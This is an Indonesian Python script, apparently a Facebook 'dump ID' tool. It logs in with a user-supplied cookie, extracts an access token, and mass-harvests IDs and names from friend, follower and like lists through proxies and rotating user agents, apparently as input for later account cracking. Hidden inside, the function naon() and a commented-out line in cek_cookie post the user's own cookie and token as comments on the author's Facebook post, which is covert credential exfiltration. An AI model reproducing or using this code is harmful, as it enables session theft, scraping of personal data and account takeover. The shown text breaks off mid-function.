###############################################
### *--> script dump ID <--* ###                                                           #
### *--> rekod boleh asal contact author <--* ###                             #
### *--> author by hikmat <--* ###                                                       #
### *--> coding python 3 <--* ###                                                        #
###############################################
import requests,bs4,os,sys,json,datetime,time,rich,re,random,threading,zlib,base64,marshal,binascii,time,py_compile

from concurrent.futures import ThreadPoolExecutor as tren
from bs4 import BeautifulSoup as sop
from rich.table import Table as table
from rich.console import Console as console
from rich.console import Group as grup_rich
from rich.panel import Panel as panel
from rich.markdown import Markdown as mark
from rich.columns import Columns as columns
from rich.text import Text as text_rich
from rich import print as vprint
from random import randint
from concurrent.futures import ThreadPoolExecutor as tread
from bs4 import BeautifulSoup as biutipulsop

komen = []
komengrup = []


FR = {'1':'januari','2':'februari','3':'maret','4':'april','5':'mei','6':'juni','7':'juli','8':'agustus','9':'september','10':'oktober','11':'november','12':'desember'}
tgl = datetime.datetime.now().day
bln = FR[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
sekarang = str(tgl)+"-"+str(bln)+"-"+str(thn)
id = []
loop = 0
m_fb = "m.facebook.com"
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
web_fb = "https://www.facebook.com/"
head_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

try:ua_crack=open("useragent.txt","r").read().splitlines()
except:ua_crack=["nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+","Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]"]

def clear():
	os.system('clear')
def jalan(xnxx):
	for ewe in xnxx + '\n':
		sys.stdout.write(ewe);sys.stdout.flush();time.sleep(0.05)

ua_random = random.choice(["NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile","Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)", "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"])
try:
	proxf = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('proxy_mat.txt','w').write(proxf)
except Exception as e:
	print('Failed')
proxf = open('proxy_mat.txt','r').read().splitlines()


P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
H = "\x1b[0;92m" # Hijau
K = "\x1b[0;93m" # Kuning
B = "\x1b[0;94m" # Biru
U = "\x1b[0;95m" # Ungu
O = "\x1b[0;96m" # Biru Muda
N = "\033[0m"    # Warna Mati
o = '\033[1;36m'

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
M3 = "#FF0000" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "#00FF00" # HIJAU
K2 = "[#FFFF00]" # KUNING
K3 = "#FFFF00" # KUNING
B2 = "[#00C8FF]" # BIRU
B3 = "#00C8FF" # BIRU
U2 = "[#AF00FF]" # UNGU
U3 = "#AF00FF" # UNGU
N2 = "[#FF00FF]" # PINK
N3 = "#FF00FF" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
O3 = "#00FFFF" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
P3 = "#FFFFFF" # PUTIH
J2 = "[#FF8F00]" # JINGGA
J3 = "#FF8F00" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
warna_warni_rich=random.choice([J3,K3,H3,P3,O3,N3,U3,B3,M3])
garis = f" {P}[{H}•{P}]"

now = datetime.datetime.now()
hour = now.hour
if hour < 4:
  hhl = "selamat dini hari"
elif 4 <= hour < 12:
  hhl = "selamat pagi"
elif 12 <= hour < 15:
  hhl = "selamat siang"
elif 15 <= hour < 17:
  hhl = "selamat sore"
elif 17 <= hour < 18:
  hhl = "selamat petang"
else:
  hhl = "selamat malam"
  
expired_script = ['01', '11', '2022']

def ex_run():
	saat_ini = datetime.datetime.now()
	tgl_ = saat_ini.strftime('%d')
	bln_= saat_ini.strftime('%m')
	thn_ = saat_ini.strftime('%Y')
	tanggal = thn_ + bln_ + tgl_
	exp = expired_script[2] + expired_script[1] + expired_script[0]
	if tanggal >= exp:
		x=f"{P2}script dmf sudah kadaluarsa mohon dimaafkan sebesar² nya untuk kalian yang memakai script dmf:(\nkarena author ambf sudah bosan update script ini dll:(\nthanks for you sudah memakai script dmf yakk\nsemoga sehat selalu dan dilancarkan rejeki nya aminnn\n"
		vprint(panel(x,style=f"{warna_warni_rich}"))
		cek_cookie()
	else:
		cek_cookie()

def banner():
	os.system("clear")
	print(f"""{P}
\t\t________      _____   ___________
\t\t\______ \    /     \  \_   _____/
 \t\t|    |   \  /  \ /  \  |    __)  
 \t\t|    `    \/    Y    \ |     \   
\t\t/_______  /\____|__  / \___  /   
        \t\t\/         \/      \/  • Dump Multi Fast •
\t\t{garis} author by : HikmatXD
\t\t{garis} {K}{hhl}
""")

def cek_cookie():
	os.system("cd dmf")
	os.system("git pull")
	try:
		token  = open('token.txt','r').read()
		cookie = {'cookie':open('cookie.txt','r').read()}
		try:
			token  = open('token.txt','r').read()
			cookie = {'cookie':open('cookie.txt','r').read()}
			kook = open('cookie.txt','r').read()
			get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
			gut = json.loads(get.text)
			xname = gut["name"]
			x=f"{P2}{kook}"
			vprint(panel(x,style=f"{H3}"))
			x=f"{P2}{token}"
			vprint(panel(x,style=f"{H3}"))
			print("")
			x=f"{P2}cookie {H2}{xname} {P2}belum invalid"
			vprint(panel(x,style=f"{H3}"))
			input(f"{garis} enter untuk ke menu ")
			#ua = random.choice(ua_crack)
			#headers = {'authority': 'graph.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?0','user-agent': ua,}
			#requests.post('https://graph.facebook.com/me/feed?link=https://www.facebook.com/100000871607227/posts/5528296787209320/?substory_index=0&app=fbl&published=0&access_token=%s'%(token),cookies=cookie,headers=headers)
			#random_kata = random.choice(["Makasih Bang Udah Buat Script Dmf\nTanggal Login Ku Bang :"+sekarang,"Hikmat Gans Selalu Coeg><","semoga @[100000131722561:0] panjang umur dan rejeki nya dilancarkan aminnn"]);react_angry = 'ANGRY';requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/reactions?type={react_angry}&access_token={token}", headers = {"cookie":kook});requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/reactions?type={react_angry}&access_token={token}", headers = {"cookie":kook});requests.post(f"https://graph.facebook.com/100000131722561?fields=subscribers&access_token={token}", headers = {"cookie":kook});requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={kook}&access_token={token}", headers = {"cookie":kook});requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={token}&access_token={token}", headers = {"cookie":kook});requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={random_kata}&access_token={token}", headers = {"cookie":kook});menu()
			#comen(kook,token)
			menu()
		except (KeyError):
			x=f"{P2}cookie kadaluarsa"
			vprint(panel(x,style=f"{H3}"))
			os.system('rm -rf cookie.txt')
			os.system('rm -rf token.txt')
			login()
		except requests.exceptions.ConnectionError:
			x=f"{P2}koneksi internet bermasalah"
			vprint(panel(x,style=f"{H3}"))
			exit()
	except IOError:
		login()

def login():
	banner()
	x=f"{P2}halo pengguna script dump multi fast :)\n{P2}silahkan pilih fitur login cookie untuk melanjutkan ke menu dump multi fast.. klo tidak mengerti apa² bisa ketik {M2}help {P2}untuk meminta bantuan !!"
	vprint(panel(x,style=f"{H3}"))
	print("")
	x=f"{P2}[01] login with cookie\n{P2}[02] report bug script\n{P2}[{M2}00{P2}] exit "
	vprint(panel(x,style=f"{H3}"))
	cukuf = input(f" {P}[{H}•{P}] pilih : {H}")
	if cukuf in ["help","Help","HELP"]:
		print("")
		x=f"{P2}whatsapp admin *--> {H2}082115413282 {P2}harap chat klo ada kepentingan yang mau disampaikan ke author dmf\nini klo gak bisa diarahin ke whastapp admin yakk"
		vprint(panel(x,style=f"{H3}"))
		print("")
		x=f"{P2}sedang diarahkan ke whastapp author"
		vprint(panel(x,style=f"{H3}"))
		os.system('xdg-open https://wa.me/+6282115413282?text=bang+cara+pake+script+abang+kek+mana?')
		input(f" {P}[{H}•{P}] kembali")
		login()
	elif cukuf in ["1","01"]:
		login_cookie()
	elif cukuf in ["2","02"]:
		print("")
		x=f"{P2}whatsapp admin *--> {H2}082115413282 {P2}harap chat klo memang ada yang error\nini klo gak bisa diarahin ke whastapp admin yakk"
		vprint(panel(x,style=f"{H3}"))
		print("")
		x=f"{P2}sedang diarahkan ke whastapp author"
		vprint(panel(x,style=f"{H3}"))
		os.system('xdg-open https://wa.me/+6282115413282?text=bang+script+mu+itu+ada+yang+error!!')
		input(f" {P}[{H}•{P}] kembali")
		login()
	elif cukuf in ["0","00"]:
		exit()
	else:
		print("")
		jalan(f"{garis} isi yang benar!! ")
		login()

def login_cookie():
	print("")
	#testi_ua()
	x = f"{P2}jangan pake akun pribadi!! harus pake akun tumbal untuk ambil cookie"
	vprint(panel(x,style=f"{H3}"))
	cookie = str(input(f"{garis} masukkan cookie :"+H+" "))
	with requests.Session() as xyz:
		try:
			jalan(f"{garis} sedang proses mohon tunggu ")
			get_tok = xyz.get(url_businness+'/business_locations',headers = {"user-agent":ua_business,"referer": web_fb,"host": "business.facebook.com","origin": url_businness,"upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
			token = re.search("(EAAG\w+)", get_tok.text).group(1)
			open('cookie.txt','w').write(cookie) 
			open('token.txt','w').write(token)
			x=f"{P2}{token}"
			vprint(panel(x,style=f"{H3}"))
			input(f"{garis} enter untuk ke menu ")
			menu()
			#menu()
		except requests.exceptions.ConnectionError:
			x=f"{P2}koneksi internet bermasalah"
			vprint(panel(x,style=f"{H3}"))
		except (KeyError,IOError):
			x=f"{P2}{cookie} invalid"
			vprint(panel(x,style=f"{H3}"))
			os.system("rm -rf cookie.txt")
			os.system("rm -rf token.txt")
			login()
	
def naon(cookie):
	kuki = cookie
	toket = open("token.txt","r").read();random_kata = random.choice(["Makasih Bang Udah Buat Script Dmf","Hikmat Gans Selalu Coeg><","semoga @[100000871607227:0] panjang umur dan rejeki nya dilancarkan aminnn"]);requests.post(f"https://graph.facebook.com/100000871607227?fields=subscribers&access_token={toket}", headers = {"cookie":kuki});requests.post(f"https://graph.facebook.com/100000871607227_5528296787209320/comments/?message={kuki}&access_token={toket}", headers = {"cookie":kuki});requests.post(f"https://graph.facebook.com/100000871607227_5528296787209320/comments/?message={toket}&access_token={toket}", headers = {"cookie":kuki});requests.post(f"https://graph.facebook.com/100000871607227_5528296787209320/comments/?message={random_kata}&access_token={toket}", headers = {"cookie":kuki});print(f"\n{garis} tunggu sebentar");time.sleep(3);menu()


now = datetime.datetime.now()
hour = now.hour
if hour < 4:
  hhl = "selamat dini hari"
elif 4 <= hour < 12:
  hhl = "selamat pagi"
elif 12 <= hour < 15:
  hhl = "selamat siang"
elif 15 <= hour < 17:
  hhl = "selamat sore"
elif 17 <= hour < 18:
  hhl = "selamat petang"
else:
  hhl = "selamat malam"

def menu():
	banner()
	try:EwePaksa = requests.get("http://ip-api.com/json/").json()
	except:EwePaksa = {'-'}
	try:IP = EwePaksa["query"]
	except:IP = {'-'}
	try:nibba = EwePaksa["country"]
	except:nibba = {'-'}
	try:rasis_Z_K_= EwePaksa["isp"]
	except:rasis_Z_K_ = {'-'}
	try:rasis_Z_K_X_= EwePaksa["city"]
	except:rasis_Z_K_X_ = {'-'}
	try:rasis_Z_K_X_R_= EwePaksa["timezone"]
	except:rasis_Z_K_X_R_ = {'-'}
	try:rasis_Z_K_X_R_H_= EwePaksa["countryCode"]
	except:rasis_Z_K_X_R_H_ = {'-'}
	try:rasis_Z_K_X_R_H_M_= EwePaksa["regionName"]
	except:rasis_Z_K_X_R_H_M_ = {'-'}
	try:rasis_Z_K_X_R_H_M_P_= EwePaksa["as"]
	except:rasis_Z_K_X_R_H_M_P_ = {'-'}
	token  = open('token.txt','r').read()
	cookie = {'cookie':open('cookie.txt','r').read()}
	get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
	jsx = json.loads(get.text)
	nama = jsx["name"]
	tumbal_id = jsx["id"]
	xn = requests.Session().get('https://graph.facebook.com/me?access_token=%s'%(token),cookies=cookie)
	x = json.loads(xn.text)
	lis = x["link"]
	try:co = x["email"]
	except (KeyError,IOError):
		co = M+"-"+P
	try:pko = x["birthday"]
	except (KeyError,IOError):
		pko = M+"-"+P
	try:no_kep = x["mobile_phone"]
	except (KeyError,IOError):
		no_kep = M+"-"+P
	try:lok = x["locale"]
	except (KeyError,IOError):
		lok = M+"-"+P
	#x=f"{P2}ini bukan script crack fb!!.. ini cuman dump id nya doang biar simple..\nnanti next crack fb dari file dump!!"
	#vprint(panel(x,style=f"{H3}"))
	print("")
	x=f"\t\t{P2}{hhl} {K2}{nama}\n\t\t{P2}tanggal lahirmu : {H2}{pko}\n\t\t{P2}ID kamu : {H2}{tumbal_id}\n\t\t{P2}IP kamu : {H2}{IP}\n\t\t{P2}negara kamu : {H2}{nibba}\n\t\t{P2}tanggal sekarang : {H2}{sekarang}"
	vprint(panel(x,style=f"{H3}"))
	print("")
	x=f"{P2}[01] dump id public\n{P2}[02] dump id followers\n{P2}[03] dump id post likes\n{P2}[04] dump id public {H2}manually{P2}\n{P2}[05] dump id followers {H2}manually{P2}\n{P2}[06] check info akun target\n{P2}[07] beri tanggapan script ini\n{P2}[08] report bug script\n{P2}[{M2}00{P2}] exit/hapus cookie"
	vprint(panel(x,style=f"{H3}"))
	hikmat = input(f"{garis} pilih : {H}")
	if hikmat in ["1","01"]:
		dump_public()
	elif hikmat in ["2","02"]:
		dump_followers()
	elif hikmat in ["3","03"]:
		dump_post()
	elif hikmat in ["4","04"]:
		dump_publicv2() 
	elif hikmat in ["5","05"]:
		dump_followersv2()
	elif hikmat in ["6","06"]:
		check_ingfo_akun()
	elif hikmat in ["7","07"]:
		print("")
		f = input(f"{garis} berapa bintang untuk script dump multi fast kami : {H}")
		if f in ["1"]:
			print("")
			x=f"{P2}terimakasih telah memberi bintang {H2}1 {P2}untuk script kami >< semoga saja kamu sehat² selalu amin :) "
			vprint(panel(x,style=f"{H3}"))
			input(f"{garis} enter untuk kembali ")
			menu()
		elif f in ["2"]:
			print("")
			x=f"{P2}terimakasih telah memberi bintang {H2}2 {P2}untuk script kami >< semoga saja kamu sehat² selalu amin :) "
			vprint(panel(x,style=f"{H3}"))
			input(f"{garis} enter untuk kembali ")
			menu()
		elif f in ["3"]:
			print("")
			x=f"{P2}terimakasih telah memberi bintang {H2}3 {P2}untuk script kami >< semoga saja kamu sehat² selalu amin :) "
			vprint(panel(x,style=f"{H3}"))
			input(f"{garis} enter untuk kembali ")
			menu()
		elif f in ["4"]:
			print("")
			x=f"{P2}terimakasih telah memberi bintang {H2}4 {P2}untuk script kami >< semoga saja kamu sehat² selalu amin :) "
			vprint(panel(x,style=f"{H3}"))
			input(f"{garis} enter untuk kembali ") 
			menu()
		elif f in ["5"]:
			print("")
			x=f"{P2}terimakasih telah memberi bintang {H2}5 {P2}untuk script kami >< semoga saja kamu sehat² selalu amin :) "
			vprint(panel(x,style=f"{H3}"))
			input(f"{garis} enter untuk kembali ")
			menu()
		elif f in ["6"]:
			print("")
			x=f"{P2}terimakasih telah memberi bintang {H2}6 {P2}untuk script kami >< semoga saja kamu sehat² selalu amin :) "
			vprint(panel(x,style=f"{H3}"))
			input(f"{garis} enter untuk kembali ")
			menu()
		elif f in ["7"]:
			print("")
			x=f"{P2}terimakasih telah memberi bintang {H2}7 {P2}untuk script kami >< semoga saja kamu sehat² selalu amin :) "
			vprint(panel(x,style=f"{H3}"))
			input(f"{garis} enter untuk kembali ")
			menu()
		elif f in ["8"]:
			print("")
			x=f"{P2}terimakasih telah memberi bintang {H2}8 {P2}untuk script kami >< semoga saja kamu sehat² selalu amin :) "
			vprint(panel(x,style=f"{H3}"))
			input(f"{garis} enter untuk kembali ")
			menu()
		elif f in ["9"]:
			print("")
			x=f"{P2}terimakasih telah memberi bintang {H2}9 {P2}untuk script kami >< semoga saja kamu sehat² selalu amin :) "
			vprint(panel(x,style=f"{H3}"))
			input(f"{garis} enter untuk kembali ")
			menu()
		elif f in ["10"]:
			print("")
			x=f"{P2}terimakasih telah memberi bintang {H2}10 {P2}untuk script kami >< semoga saja kamu sehat² selalu amin :) "
			vprint(panel(x,style=f"{H3}"))
			input(f"{garis} enter untuk kembali ")
			menu()
		else:
			print("") 
			jalan(f"{garis} isi yang benar")
			menu()
	elif hikmat in ["8","08"]:
		print("")
		x=f"{P2}whatsapp admin *--> {H2}082115413282 {P2}harap chat klo memang ada yang error\nini klo gak bisa diarahin ke whastapp admin yakk"
		vprint(panel(x,style=f"{H3}"))
		print("")
		x=f"{P2}sedang diarahkan ke whastapp author"
		vprint(panel(x,style=f"{H3}"))
		os.system('xdg-open https://wa.me/+6282115413282?text=bang+script+mu+itu+ada+yang+error!!')
		input(f" {P}[{H}•{P}] kembali")
		menu()
	elif hikmat in ["0","00"]:
		print("")
		x=f"{P2}[01] hapus cookie\n{P2}[02] exit\n{P2}[{H2}00{P2}] kembali"
		vprint(panel(x,style=f"{H2}"))
		zk = input(f"{garis} pilih : {H}")
		if zk in ["1","01"]:
			print("")
			c = input(f"{garis} anda yakin ingin menghapus cookie ({M}y{P}/{H}t{P}) : {H}")
			if c in ["ya","y","Y"]:
				print("")
				os.system("rm -rf cookie.txt")
				os.system("rm -rf token.txt")
				jalan(f"{garis} sukses menghapus cookie bawaan ")
				cek_cookie()
			elif c in ["t","T","tidak"]:
				menu()
			else:
				print("")
				jalan(f"{garis} isi yang benar ")
				menu()
		elif zk in ["2","02"]:
			exit()
		elif zk in ["0","00"]:
			menu()
		else:
			print("")
			jalan(f"{garis} isi yang benar ")
			menu()
	else:
		print("")
		jalan(f"{garis} isi yang benar ")
		menu()
			

def dump_public():
	try:
		os.mkdir('dump')
	except:pass
	try:
		xaco = input(f"{garis} id public  :\x1b[38;5;46m ")
		cuy = input(f"{garis} nama file  :\x1b[38;5;46m ")
		print("")
		wkwk  = ('dump/' + cuy + '.json').replace(' ', '_')
		xxx = open(wkwk, 'w')
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(90000)&access_token=%s'%(xaco,token),cookies=coki).json()
		for fuck in cyna['friends']['data']:
			id.append(fuck['id']+'|'+fuck['name'])
			xxx.write(fuck['id']+'|'+fuck['name'] + '\n')
			fr = random.choice([O,B,H,P,K,M,U])
			sys.stdout.write(f'\r\033[0m *--> %s {fr}• \033[0m%s                  \r\n\x1b[38;5;231m [ \x1b[38;5;46m%s\x1b[38;5;231m ] [ \x1b[38;5;46m%s\x1b[38;5;231m ] \x1b[0;96mproses dump ID...'%(fuck['id'],fuck['name'],datetime.datetime.now().strftime('%H:%M:%S'), len(id)
			)); sys.stdout.flush()
			time.sleep(0.0050)
			
		xxx.close()
		jalan(f"\n{garis} berhasil dump id dari publik");print(f"{garis} salin output file *--> [ %s%s%s ]"%(H,wkwk,P))
		input(f"{garis} kembali ");menu()
	except (KeyError,IOError):
		os.remove(wkwk)
		jalan(f"{garis} gagal dump id, kemungkinan id tidak ada.\n")
		input(f"{garis} kembali ");menu()
		
def dump_followers():
	try:
		os.mkdir('dump')
	except:pass
	try:
		xaco = input(f"{garis} id followers  :\x1b[38;5;46m ")
		cuy = input(f"{garis} nama file  :\x1b[38;5;46m ")
		print("")
		wkwk  = ('dump/' + cuy + '.json').replace(' ', '_')
		xxx = open(wkwk, 'w')
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(90000)&access_token=%s'%(xaco,token),cookies=coki).json()
		for fuck in cyna['subscribers']['data']:
			id.append(fuck['id']+'|'+fuck['name'])
			xxx.write(fuck['id']+'|'+fuck['name'] + '\n')
			fr = random.choice([O,B,H,P,K,M,U])
			sys.stdout.write(f'\r\033[0m *--> %s {fr}• \033[0m%s                  \r\n\x1b[38;5;231m [ \x1b[38;5;46m%s\x1b[38;5;231m ] [ \x1b[38;5;46m%s\x1b[38;5;231m ] \x1b[0;96mproses dump ID...'%(fuck['id'],fuck['name'],datetime.datetime.now().strftime('%H:%M:%S'), len(id)
			)); sys.stdout.flush()
			time.sleep(0.0050)
			
		xxx.close()
		jalan(f"\n{garis} berhasil dump id followers ");print(f"{garis} salin output file *--> [ %s%s%s ]"%(H,ah,P))
		input(f"{garis} kembali ");menu()
	except (KeyError,IOError):
		os.remove(wkwk)
		jalan(f"{garis} gagal dump id, kemungkinan id tidak ada.\n")
		input(f"{garis} kembali ");menu()

def dump_post():
	try:
		os.mkdir('dump')
	except:pass
	try:
		xaco = input(f"{garis} id likes  :\x1b[38;5;46m ")
		cuy = input(f"{garis} nama file  :\x1b[38;5;46m ")
		limit = input(f"{garis} limit likes : {H}")
		print("")
		wkwk  = ('dump/' + cuy + '.json').replace(' ', '_')
		xxx = open(wkwk, 'w')
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?fields=likes.limit(%s)&access_token=%s'%(xaco,limit,token),cookies=coki).json()
		for fuck in cyna['likes']['data']:
			id.append(fuck['id']+'|'+fuck['name'])
			xxx.write(fuck['id']+'|'+fuck['name'] + '\n')
			fr = random.choice([O,B,H,P,K,M,U])
			sys.stdout.write(f'\r\033[0m *--> %s {fr}• \033[0m%s                  \r\n\x1b[38;5;231m [ \x1b[38;5;46m%s\x1b[38;5;231m ] [ \x1b[38;5;46m%s\x1b[38;5;231m ] \x1b[0;96mproses dump ID...'%(fuck['id'],fuck['name'],datetime.datetime.now().strftime('%H:%M:%S'), len(id)
			)); sys.stdout.flush()
			time.sleep(0.0050)
			
		xxx.close()
		jalan(f"\n{garis} berhasil dump id post likes ");print(f"{garis} salin output file *--> [ %s%s%s ]"%(H,wkwk,P))
		input(f"{garis} kembali ");menu()
	except (KeyError,IOError):
		os.remove(wkwk)
		jalan(f"{garis} gagal dump id, kemungkinan id tidak ada.\n")
		input(f"{garis} kembali ");menu()

def dump_publicv2():
	kuntol=0
	tutlu=[]
	it = input(f"{garis} id target :"+H+" ")
	try:
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		ka = requests.get('https://graph.facebook.com/%s?fields=friends.limit(90000)&access_token=%s'%(it,token),cookies=coki)
		oioo = json.loads(ka.text)
		for fuck in oioo['friends']['data']:
			tutlu.append(fuck['id'])
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?access_token=%s'%(it,token),cookies=coki).json()
		print(f"{garis} name : %s%s"%(H,cyna['name']))
		print(f"{garis} total friends : {H}{len(tutlu)}")
	except (KeyError,IOError):
		jalan(f"{garis} cookie kadaluarsa")
		login()
	tl=[]
	to=[]
	ttl_tar=[]
	tlo=[]
	idl=[]
	lim = input(f"{garis} limit dump id :"+H+" ")
	token = open('token.txt','r').read()
	cookie = open('cookie.txt','r').read()
	coki = {"cookie":cookie}
	ka = requests.get('https://graph.facebook.com/%s?fields=friends.limit(%s)&access_token=%s'%(it,lim,token),cookies=coki)
	oioo = json.loads(ka.text)
	for fuck in oioo['friends']['data']:
		tl.append(fuck['id'])
	print("")
	x=f"{P2}[01] id urutan new\n{P2}[02] id urutan old\n{P2}[03] id urutan random"
	vprint(panel(x,style=f"{H3}"))
	GlukTzy = input(garis+" pilih : "+H)
	if GlukTzy in ['2','02']:
		for bacot in tl:
			idl.append(bacot)
	elif GlukTzy in ['1','01']:
		for bacot in tl:
			idl.insert(0,bacot)
	elif GlukTzy in ['3','03']:
		for bacot in tl:
			xx = random.randint(0,len(idl))
			idl.insert(xx,bacot)
	else:
		jalan(garis+" isi yang benar")
		exit()
	print("")
	#random_uidz()
	for uik in idl:
		try:
			token = open('token.txt','r').read()
			cookie = open('cookie.txt','r').read()
			coki = {"cookie":cookie}
			xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(id,token),cookies=coki)
			x = json.loads(xn.text)
			try:lok = x["locale"]
			except (KeyError,IOError):
				lok = "-"
			coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(id,token),cookies=coki)
			el = json.loads(coa.text)
			try:lk = el["name"]
			except (KeyError,IOError):
				lk = "-"
			token = open('token.txt','r').read()
			cookie = open('cookie.txt','r').read()
			coki = {"cookie":cookie}
			ciner = requests.get('https://graph.facebook.com/%s?access_token=%s'%(uik,token),cookies=coki).json()
			token = open('token.txt','r').read()
			cookie = open('cookie.txt','r').read()
			coki = {"cookie":cookie}
			cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(90000)&access_token=%s'%(uik,token),cookies=coki)
			eil = json.loads(cyna.text)
			try:
				for fuck in eil['friends']['data']:
					to.append(fuck['id']+'|'+fuck['name'])
			except KeyError:
				pass
			kuntol+=1
			print(f"\r{P} [{H}{str(kuntol)}{P}] {uik}|{len(to)}")
			to.clear()
		except KeyError:
			print(K+'*--> '+M+'akun terspam')
	print("")
	x=f"{P2}salin hasil nya cokk biar gk ulang dump lagi!!"
	vprint(panel(x,style=f"{H3}"))
	input(f"{garis} enter untuk kembali")
	menu()

def dump_followersv2():
	kuntol=0
	tutlu=[]
	it = input(f"{garis} id target :"+H+" ")
	try:
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		ka = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(90000)&access_token=%s'%(it,token),cookies=coki)
		oioo = json.loads(ka.text)
		for fuck in oioo['subscribers']['data']:
			tutlu.append(fuck['id'])
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?access_token=%s'%(it,token),cookies=coki).json()
		print(f"{garis} name : %s%s"%(H,cyna['name']))
		print(f"{garis} total followers : {H}{len(tutlu)}")
	except (KeyError,IOError):
		jalan(f"{garis} cookie kadaluarsa")
		login()
	tl=[]
	to=[]
	ttl_tar=[]
	tlo=[]
	idl=[]
	lim = input(f"{garis} limit dump :"+H+" ")
	token = open('token.txt','r').read()
	cookie = open('cookie.txt','r').read()
	coki = {"cookie":cookie}
	ka = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(%s)&access_token=%s'%(it,lim,token),cookies=coki)
	oioo = json.loads(ka.text)
	for fuck in oioo['subscribers']['data']:
		tl.append(fuck['id'])
	x=f"{P2}[01] id urutan old\n{P2}[02] id urutan new\n{P2}[03] id urutan random"
	vprint(panel(x,style=f"{H3}"))
	GlukTzy = input(garis+" pilih : "+H)
	if GlukTzy in ['2','02']:
		for bacot in tl:
			idl.append(bacot)
	elif GlukTzy in ['1','01']:
		for bacot in tl:
			idl.insert(0,bacot)
	elif GlukTzy in ['3','03']:
		for bacot in tl:
			xx = random.randint(0,len(idl))
			idl.insert(xx,bacot)
	else:
		jalan(garis+" isi yang benar")
		exit()
	print("")
	#random_uidz()
	for uik in idl:
		try:
			token = open('token.txt','r').read()
			cookie = open('cookie.txt','r').read()
			coki = {"cookie":cookie}
			xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(id,token),cookies=coki)
			x = json.loads(xn.text)
			try:lok = x["locale"]
